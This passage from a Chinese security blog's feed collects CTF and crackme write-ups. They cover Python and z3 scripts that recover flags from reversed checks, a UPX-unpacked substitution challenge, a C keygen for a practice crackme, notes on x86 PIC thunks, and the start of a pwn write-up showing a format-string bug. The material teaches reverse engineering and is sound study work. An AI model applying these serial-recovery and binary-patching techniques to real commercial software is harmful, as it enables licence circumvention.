class="number">6771600</span></span><br><span class="line">,<span class="number">357245568</span>//<span class="number">3682944</span></span><br><span class="line">,<span class="number">1074393000</span>//<span class="number">10431000</span></span><br><span class="line">,<span class="number">489211344</span>//<span class="number">3977328</span></span><br><span class="line">,<span class="number">518971936</span>//<span class="number">5138336</span></span><br><span class="line">,<span class="number">406741500</span>//<span class="number">7532250</span></span><br><span class="line">,<span class="number">294236496</span>//<span class="number">5551632</span></span><br><span class="line">,<span class="number">177305856</span>//<span class="number">3409728</span></span><br><span class="line">,<span class="number">650683500</span>//<span class="number">13013670</span></span><br><span class="line">,<span class="number">298351053</span>//<span class="number">6088797</span></span><br><span class="line">,<span class="number">386348487</span>//<span class="number">7884663</span></span><br><span class="line">,<span class="number">438258597</span>//<span class="number">8944053</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  if ( 5198490 * flag[14] != 249527520 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 4544518 * flag[15] != 445362764 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 3645600 * flag[17] != 174988800 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 10115280 * flag[16] != 981182160 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 9667504 * flag[18] != 493042704 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 5364450 * flag[19] != 257493600 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 13464540 * flag[20] != 767478780 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 5488432 * flag[21] != 312840624 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 14479500 * flag[22] != 1404511500 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 6451830 * flag[23] != 316139670 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 6252576 * flag[24] != 619005024 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 7763364 * flag[25] != 372641472 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 7327320 * flag[26] != 373693320 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 8741520 * flag[27] != 498266640 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 8871876 * flag[28] != 452465676 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 4086720 * flag[29] != 208422720 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 9374400 * flag[30] == 515592000 )</span></span><br><span class="line"><span class="string">    return 5759124 * flag[31] == 719890500;</span></span><br><span class="line"><span class="string">  return 0LL;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配至少三次数字才有效</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d&#123;3,&#125;&#x27;</span>)</span><br><span class="line">flagRe = pattern.findall(text)</span><br><span class="line">print(flagRe)</span><br><span class="line"></span><br><span class="line">smallList = []</span><br><span class="line">bigList = []</span><br><span class="line">flagAppend = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flagRe),<span class="number">2</span>):</span><br><span class="line">    smallList.append(<span class="built_in">int</span>(flagRe[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flagRe),<span class="number">2</span>):</span><br><span class="line">    bigList.append(<span class="built_in">int</span>(flagRe[i]))</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(smallList))</span><br><span class="line">print(<span class="built_in">len</span>(bigList))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(smallList)):</span><br><span class="line">    flagAppend.append(bigList[i] // smallList[i])</span><br><span class="line"></span><br><span class="line">print(flagAppend)</span><br><span class="line"></span><br><span class="line">flag = flag + flagAppend</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><p>后来由于这俩坑点就怎么交也不对，搜了师傅们的wp才发现…<br>还有一种解法就是用z3约束器来解（学到了学到了</p><blockquote><p><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p></blockquote><p>用这种方法来解也比较方便，先解出来然后再转ascii码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = Int(<span class="string">&quot;flag[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">1629056</span> * flag[<span class="number">0</span>] == <span class="number">166163712</span>)</span><br><span class="line">s.add(<span class="number">6771600</span> * flag[<span class="number">1</span>] == <span class="number">731332800</span>)</span><br><span class="line">s.add(<span class="number">3682944</span> * flag[<span class="number">2</span>] == <span class="number">357245568</span>)</span><br><span class="line">s.add(<span class="number">10431000</span> * flag[<span class="number">3</span>] == <span class="number">1074393000</span>)</span><br><span class="line">s.add(<span class="number">3977328</span> * flag[<span class="number">4</span>] == <span class="number">489211344</span>)</span><br><span class="line">s.add(<span class="number">5138336</span> * flag[<span class="number">5</span>] == <span class="number">518971936</span>)</span><br><span class="line">s.add(<span class="number">7532250</span> * flag[<span class="number">7</span>] == <span class="number">406741500</span>)</span><br><span class="line">s.add(<span class="number">5551632</span> * flag[<span class="number">8</span>] == <span class="number">294236496</span>)</span><br><span class="line">s.add(<span class="number">3409728</span> * flag[<span class="number">9</span>] == <span class="number">177305856</span>)</span><br><span class="line">s.add(<span class="number">13013670</span> * flag[<span class="number">10</span>] == <span class="number">650683500</span>)</span><br><span class="line">s.add(<span class="number">6088797</span> * flag[<span class="number">11</span>] == <span class="number">298351053</span>)</span><br><span class="line">s.add(<span class="number">7884663</span> * flag[<span class="number">12</span>] == <span class="number">386348487</span>)</span><br><span class="line">s.add(<span class="number">8944053</span> * flag[<span class="number">13</span>] == <span class="number">438258597</span>)</span><br><span class="line">s.add(<span class="number">5198490</span> * flag[<span class="number">14</span>] == <span class="number">249527520</span>)</span><br><span class="line">s.add(<span class="number">4544518</span> * flag[<span class="number">15</span>] == <span class="number">445362764</span>)</span><br><span class="line">s.add(<span class="number">3645600</span> * flag[<span class="number">17</span>] == <span class="number">174988800</span>)</span><br><span class="line">s.add(<span class="number">10115280</span> * flag[<span class="number">16</span>] == <span class="number">981182160</span>)</span><br><span class="line">s.add(<span class="number">9667504</span> * flag[<span class="number">18</span>] == <span class="number">493042704</span>)</span><br><span class="line">s.add(<span class="number">5364450</span> * flag[<span class="number">19</span>] == <span class="number">257493600</span>)</span><br><span class="line">s.add(<span class="number">13464540</span> * flag[<span class="number">20</span>] == <span class="number">767478780</span>)</span><br><span class="line">s.add(<span class="number">5488432</span> * flag[<span class="number">21</span>] == <span class="number">312840624</span>)</span><br><span class="line">s.add(<span class="number">14479500</span> * flag[<span class="number">22</span>] == <span class="number">1404511500</span>)</span><br><span class="line">s.add(<span class="number">6451830</span> * flag[<span class="number">23</span>] == <span class="number">316139670</span>)</span><br><span class="line">s.add(<span class="number">6252576</span> * flag[<span class="number">24</span>] == <span class="number">619005024</span>)</span><br><span class="line">s.add(<span class="number">7763364</span> * flag[<span class="number">25</span>] == <span class="number">372641472</span>)</span><br><span class="line">s.add(<span class="number">7327320</span> * flag[<span class="number">26</span>] == <span class="number">373693320</span>)</span><br><span class="line">s.add(<span class="number">8741520</span> * flag[<span class="number">27</span>] == <span class="number">498266640</span>)</span><br><span class="line">s.add(<span class="number">8871876</span> * flag[<span class="number">28</span>] == <span class="number">452465676</span>)</span><br><span class="line">s.add(<span class="number">4086720</span> * flag[<span class="number">29</span>] == <span class="number">208422720</span>)</span><br><span class="line">s.add(<span class="number">9374400</span> * flag[<span class="number">30</span>] == <span class="number">515592000</span>)</span><br><span class="line">s.add(<span class="number">5759124</span> * flag[<span class="number">31</span>] == <span class="number">719890500</span>)</span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p><h2 id="5-WUSTCTF2020-level1"><a href="#5-WUSTCTF2020-level1" class="headerlink" title="5.[WUSTCTF2020]level1"></a>5.[WUSTCTF2020]level1</h2><p>源码和逻辑都很简单，对flag进行加密，然后还给了output文件，应该就是flag加密后的输出结果<br><img src="https://i.loli.net/2021/04/10/lTe58pKU7iIGdRz.png" alt=""></p><p>写个解密脚本就行了（1，3，5，7…与1相与为1）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flagReverse = [</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">198</span>,</span><br><span class="line">    <span class="number">232</span>,</span><br><span class="line">    <span class="number">816</span>,</span><br><span class="line">    <span class="number">200</span>,</span><br><span class="line">    <span class="number">1536</span>,</span><br><span class="line">    <span class="number">300</span>,</span><br><span class="line">    <span class="number">6144</span>,</span><br><span class="line">    <span class="number">984</span>,</span><br><span class="line">    <span class="number">51200</span>,</span><br><span class="line">    <span class="number">570</span>,</span><br><span class="line">    <span class="number">92160</span>,</span><br><span class="line">    <span class="number">1200</span>,</span><br><span class="line">    <span class="number">565248</span>,</span><br><span class="line">    <span class="number">756</span>,</span><br><span class="line">    <span class="number">1474560</span>,</span><br><span class="line">    <span class="number">800</span>,</span><br><span class="line">    <span class="number">6291456</span>,</span><br><span class="line">    <span class="number">1782</span>,</span><br><span class="line">    <span class="number">65536000</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flagReverse)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flagReverse[i] = flagReverse[i] &gt;&gt; i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flagReverse[i] = flagReverse[i] // i</span><br><span class="line"></span><br><span class="line">    flagReverse[i] = <span class="built_in">chr</span>(flagReverse[i])</span><br><span class="line"></span><br><span class="line">flag = flagReverse[<span class="number">1</span>:]</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><h2 id="6-Youngter-drive"><a href="#6-Youngter-drive" class="headerlink" title="6.Youngter-drive"></a>6.Youngter-drive</h2><blockquote><p>UPX脱壳:<a href="https://github.com/upx/upx/releases">https://github.com/upx/upx/releases</a></p></blockquote><p>先去个壳<br><img src="https://i.loli.net/2021/04/11/cGXKI38bUisLfzJ.png" alt=""></p><p>main函数中启动了两个子线程<br><img src="https://i.loli.net/2021/04/11/rgxAZITfhmq1ozW.png" alt=""></p><p>第一个线程对于我们输入的flag进行替换<br><img src="https://i.loli.net/2021/04/11/ZTrNDyLRgpScUB9.png" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_411940</span><span class="params">(<span class="keyword">int</span> source, <span class="keyword">int</span> target_in_data_1d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+D3h] [ebp-5h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(_BYTE *)(target_in_data_1d + source);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span>) &amp;&amp; (v3 &lt; <span class="number">65</span> || v3 &gt; <span class="number">90</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="string">&#x27;a&#x27;</span> || v3 &gt; <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 大写字母 - 38，即27-52</span></span><br><span class="line">    *(_BYTE *)(target_in_data_1d + source) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(target_in_data_1d + source) - <span class="number">38</span>];</span><br><span class="line">    <span class="comment">// 将索引映射到另外一张表进行替换</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 小写字母 - 96，即1 - 26</span></span><br><span class="line">    *(_BYTE *)(target_in_data_1d + source) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(target_in_data_1d + source) - <span class="number">96</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个线程只是减去data段的一个计数器，并没有对我们输入的字符串进行操作，所以坑点1就是在我们输入的字符串中，只有偶数位（0，1，3,…29）被进行替换了<br>替换逻辑比较简单，见上面贴的注释</p><p>坑点2就是最后check的时候只检查了29位，最后一位搜的wp是填E（好像在安恒赛的时候填啥都对，然后看了一个师傅的wp觉得应该填Z，因为映射回来正好是NULL<br><img src="https://i.loli.net/2021/04/11/d4vbaU7eFPiVZwx.png" alt=""></p><p>脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line">flagRe = <span class="string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsySa&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> v3 = *(_BYTE *)(target_in_data_1d + source);</span></span><br><span class="line"><span class="string">  if ( (v3 &lt; 97 || v3 &gt; 122) &amp;&amp; (v3 &lt; 65 || v3 &gt; 90) )</span></span><br><span class="line"><span class="string">    exit(0);</span></span><br><span class="line"><span class="string">  if ( v3 &lt; &#x27;a&#x27; || v3 &gt; &#x27;z&#x27; )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    result = off_418000[0];</span></span><br><span class="line"><span class="string">    *(_BYTE *)(target_in_data_1d + source) = off_418000[0][*(char *)(target_in_data_1d + source) - &#x27;&amp;&#x27;];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    result = off_418000[0];</span></span><br><span class="line"><span class="string">    *(_BYTE *)(target_in_data_1d + source) = off_418000[0][*(char *)(target_in_data_1d + source) - &#x27;`&#x27;];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line">i = <span class="number">0x1d</span></span><br><span class="line"><span class="keyword">while</span> i &gt; -<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> key.find(flagRe[i]):</span><br><span class="line">        position = key.find(flagRe[i])</span><br><span class="line">        <span class="keyword">if</span> position &lt;= <span class="number">26</span>:</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(position + <span class="number">96</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(position + <span class="number">38</span>))</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    flag.append(flagRe[i])</span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">reversed</span>(flag)</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br><span class="line">print(<span class="built_in">len</span>(flag))</span><br></pre></td></tr></table></figure></p><p>大师傅的wp，详细解释了这个程序中反调试的部分，值得阅读:<a href="https://hx1997.github.io/2018/07/22/anheng-july-re-youngter-drive/">https://hx1997.github.io/2018/07/22/anheng-july-re-youngter-drive/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>__x86.get_pc_thunk.ax函数</title>
      <link href="2021/04/06/ax/"/>
      <url>2021/04/06/ax/</url>
      
        <content type="html"><![CDATA[<h2 id="x86-get-pc-thunk"><a href="#x86-get-pc-thunk" class="headerlink" title="__x86.get_pc_thunk"></a>__x86.get_pc_thunk</h2><p>c语言到汇编指令这篇博文中，我一开始通过gcc编译源文件，没有关闭地址随机化这个选项，在编译出的程序的反汇编中，发现了很奇怪的call指令<br>源程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">char</span> c = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">23</span>;</span><br><span class="line"><span class="keyword">char</span> b = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">short</span> c = <span class="number">12</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x11ad</span> &lt;main&gt;                           endbr32                                                                                    </span><br><span class="line">│   <span class="number">0x11b1</span> &lt;main+<span class="number">4</span>&gt;                         <span class="keyword">push</span>   <span class="built_in">ebp</span>                                                                                 </span><br><span class="line">│   <span class="number">0x11b2</span> &lt;main+<span class="number">5</span>&gt;                         <span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span>                                                                             </span><br><span class="line">│   <span class="number">0x11b4</span> &lt;main+<span class="number">7</span>&gt;                         <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x10</span>                                                                            </span><br><span class="line">│   <span class="number">0x11b7</span> &lt;main+<span class="number">10</span>&gt;                        <span class="keyword">call</span>   <span class="number">0x11d9</span> &lt;__x86<span class="number">.</span>get_pc_thunk<span class="number">.</span><span class="built_in">ax</span>&gt;                                                      </span><br><span class="line">│   <span class="number">0x11bc</span> &lt;main+<span class="number">15</span>&gt;                        <span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="number">0x2e20</span>                                                                          </span><br><span class="line">│   <span class="number">0x11c1</span> &lt;main+<span class="number">20</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x4</span>],<span class="number">0x17</span>                                                            </span><br><span class="line">│   <span class="number">0x11c8</span> &lt;main+<span class="number">27</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x7</span>],<span class="number">0x62</span>                                                             </span><br><span class="line">│   <span class="number">0x11cc</span> &lt;main+<span class="number">31</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x6</span>],<span class="number">0xc</span>                                                             </span><br><span class="line">│   <span class="number">0x11d2</span> &lt;main+<span class="number">37</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span> </span><br><span class="line">│   <span class="number">0x11d7</span> &lt;main+<span class="number">42</span>&gt;                        <span class="keyword">leave</span>                                                                                      </span><br><span class="line">│   <span class="number">0x11d8</span> &lt;main+<span class="number">43</span>&gt;                        <span class="keyword">ret</span>                           </span><br></pre></td></tr></table></figure><p>在main+10的位置处调用了一个__x86.get_pc_thunk.ax，很好奇这个是什么东西，gdb动态调试跟进去看看</p><p><img src="https://i.loli.net/2021/04/06/OD2N7xLbXAhJ5sS.png" style="zoom:50%;" /></p><p>发现了只有两条汇编指令</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,[<span class="built_in">esp</span>]</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>esp存的就是main函数的地址（因为在main函数中call了当前这个函数）</p><p>简单说这个指令就相当于<code>mov eax,eip</code></p><p>这个函数的作用就是get到main函数的地址</p><p>很好奇，为什么要获得main函数的地址呢？</p><p>我们继续往下走</p><p><img src="https://i.loli.net/2021/04/06/2UemXT6PY31hN4B.png" alt="" style="zoom:50%;" /></p><p>发现eax这里通过add一个数字后变成了GOT表的地址，这样就不难理解了（关于什么是GOT表和PLT表，我会后面再展开文章进行学习记录），这个函数在x86上的PIC（position independent code）中使用，用来实现对模块的内部数据进行访问，比如全局变量。我们在main函数中访问一下全局变量x，用gdb查看汇编代码，果然可以看到程序访问x是通过GOT进行的。</p><p><img src="https://i.loli.net/2021/04/06/1QBToDwrjivpK52.png" style="zoom:50%;" /></p><blockquote><p>事实上类似的函数还有：<code>__x86.get_pc_thunk.bx</code>，<code>__x86.get_pc_thunk.cx</code>， <code>__x86.get_pc_thunk.dx</code>。功能是类似的，只不过传入的寄存器分别为<code>%ebx</code>， <code>%ecx</code>， <code>%edx</code>。早期版本的编译器中，这个函数叫<code>__i686.get_pc_thunk.ax</code>。</p></blockquote><h2 id="关闭pie"><a href="#关闭pie" class="headerlink" title="关闭pie"></a>关闭pie</h2><p>使用gcc编译命令</p><p><code>gcc -fno-pie</code></p><p>关闭pie，调试程序发现已经不需要再通过该函数进行寻址了</p><p><img src="https://i.loli.net/2021/04/06/JO6fZ7A2sMKHxzk.png" style="zoom:50%;" /></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://stackoverflow.com/questions/50105581/how-do-i-get-rid-of-call-x86-get-pc-thunk-ax">c - How do i get rid of call    __x86.get_pc_thunk.ax - Stack Overflow</a></p><p><a href="https://qphikk.cn/archives/84">__x86.get_pc_thunk.ax函数</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c语言到汇编指令1</title>
      <link href="2021/04/06/c%E8%AF%AD%E8%A8%80%E5%88%B0%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A41/"/>
      <url>2021/04/06/c%E8%AF%AD%E8%A8%80%E5%88%B0%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A41/</url>
      
        <content type="html"><![CDATA[<p>(未完工)</p><p>近期发现pwn知识在比赛中越来越注重逆向的技能，我这才深刻认识到二进制安全是不分家的，遂开发一下逆向的技能，多注重一下基本功的技能。</p><h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p>常用的调用约定有__cdecl(c规范),pascal,stdcall,Fastcall<br>gcc编译器默认采用__cdecl调用约定<br>在上述调用约定中，只有__cdecl平衡栈的角色是调用者，其余都是子程序</p><h2 id="c语言翻译为汇编"><a href="#c语言翻译为汇编" class="headerlink" title="c语言翻译为汇编"></a>c语言翻译为汇编</h2><h3 id="局部变量和全局变量"><a href="#局部变量和全局变量" class="headerlink" title="局部变量和全局变量"></a>局部变量和全局变量</h3>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crackme</title>
      <link href="2021/03/23/crackme1/"/>
      <url>2021/03/23/crackme1/</url>
      
        <content type="html"><![CDATA[<h2 id="Peach’s-Crackme"><a href="#Peach’s-Crackme" class="headerlink" title="Peach’s Crackme"></a>Peach’s Crackme</h2><p><img src="https://i.loli.net/2021/03/23/7OH8pcVqwFJzQdS.png" alt="1.png"><br>程序简介，一个简单的注册功能<br><img src="https://i.loli.net/2021/03/23/txOWv6PMi8fRLHA.png" alt="3.png"></p><p>首先x64dbg分析一下，根据程序功能找找字符串啥的<br><img src="https://i.loli.net/2021/03/23/nSVNcGjRhlZF7kK.png" alt="4.png"><br>IDA静态分析，来定位一下地址啥的，然后f5大法直接读伪代码<br><img src="https://i.loli.net/2021/03/23/DZecAmIPGyu4Ftg.png" alt="5.png"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_4081C0(<span class="string">&quot;%d\n&quot;</span>, v4);</span><br><span class="line">v5 = sub_401A94(String);</span><br><span class="line"><span class="keyword">if</span> ( v5 == atoi(v7) )</span><br><span class="line">    MessageBoxW(a1, <span class="string">L&quot;You are such a gud boi! Lemme pat you!&quot;</span>, <span class="string">L&quot;Good boi!&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>最终定位到这个地方<br>主要分析一下v5和v7都是啥，通过ida的万能x引用大法，追踪到一个win32函数，查手册把功能和参数给搞清楚就ok了<br><img src="https://i.loli.net/2021/03/23/q9bHQUNZxaL6gSc.png" alt="2.png"></p><p>最终发现v5是注册时的名字，v7是我们输入的序列号，二者之间通过一个函数来处理，本地运行一下函数就行了，直接出序列号</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+58h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+5Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> a1[] = <span class="string">&quot;Alex&quot;</span>;</span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">    v3 += a1[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="number">431136</span> * v3 - <span class="number">3000</span>) / <span class="number">2</span> - *a1));</span><br><span class="line">&#125;          </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/23/WFdr8CReqc2Qliu.png" alt="6.png"></p><h2 id="WarGames"><a href="#WarGames" class="headerlink" title="WarGames"></a>WarGames</h2><ul><li>level : 2</li><li>Platform : Unix/linux etc.</li><li>Description : Use ./WarGames pass</li></ul><p>太简单了，把他的算法跑一遍就把结果出来了</p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> crackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn1</title>
      <link href="2021/03/13/pwn1/"/>
      <url>2021/03/13/pwn1/</url>
      
        <content type="html"><![CDATA[<p>记录下buuctf pwn的write up</p><h2 id="judgement-mna-2016"><a href="#judgement-mna-2016" class="headerlink" title="judgement_mna_2016"></a>judgement_mna_2016</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// esp</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">144</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Flag judgment system\nInput flag &gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( getnline(&amp;format, <span class="number">0x40</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">    <span class="keyword">if</span> ( 